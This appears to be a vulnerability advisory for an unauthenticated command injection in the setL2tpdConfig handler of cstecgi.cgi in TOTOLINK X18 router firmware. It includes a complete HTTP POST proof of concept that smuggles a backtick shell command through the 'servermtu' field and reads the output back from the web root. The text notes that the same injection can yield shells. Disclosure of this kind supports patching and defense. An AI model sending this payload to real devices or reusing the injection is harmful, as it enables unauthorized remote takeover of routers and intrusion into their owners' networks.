# TOTO Link X18 Unauthorized Arbitrary Command Execution vulnerability

## Supplier 

https://www.totolink.net/home/menu/detail/menu_listtpl/download/id/226/ids/36.html

version:V9.1.0cu.2024_B20220329	

## Vulnerability File

setL2tpdConfig function in cstecgi.cgi

## Describe

In the setL2tpdConfig function in the firmware of X18, there are arbitrary system command vulnerabilities and RCE vulnerabilities, which can be executed by arbitrary system commands to obtain server permissions, bounce shells, etc.

## Code Analysis

The vulnerability trigger points and the source code of the cstecgi.cgi file are as follows setL2tpdConfig  function, you can see that the value of the obtained Enabled is saved to Var, and then the value of the servermtu is saved to v10, so when Enabled=1 enters the code statement, passes the content of servemtu to dosystem, and constructs payload to directly execute system commands. dosystem is a function that encapsulates the system.

![Image](https://github.com/user-attachments/assets/b52288eb-46f2-4bcb-b95a-79b968462c40)

![Image](https://github.com/user-attachments/assets/adfa1fe4-87d0-4268-98c1-a2b5db816e40)

![Image](https://github.com/user-attachments/assets/ddef678a-a7a8-4247-9324-7c2892a1f66f)

## POC

excute "id" command.

```
POST /cgi-bin/cstecgi.cgi HTTP/1.1
Host: 192.168.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 124
Origin: http://192.168.0.1
Connection: close
Referer: http://192.168.0.1/advance/static_route.html?timestamp=1715924422681

{

"Enabled":"1",
"servermtu":"`id>/web/1.txt`",
"topicurl":"setL2tpdConfig","token":"563eeae9c15be17f3fdc4f36db0fa17f"}
```

![Image](https://github.com/user-attachments/assets/a21a8e73-8e67-46c2-8b7d-5a2c179f9702)

Result

asset the url, get command exec result.

```
http://192.168.123.16/1.txt
```

![Image](https://github.com/user-attachments/assets/fa7275ea-08bf-4a5c-93b7-0ac1c337b3df)
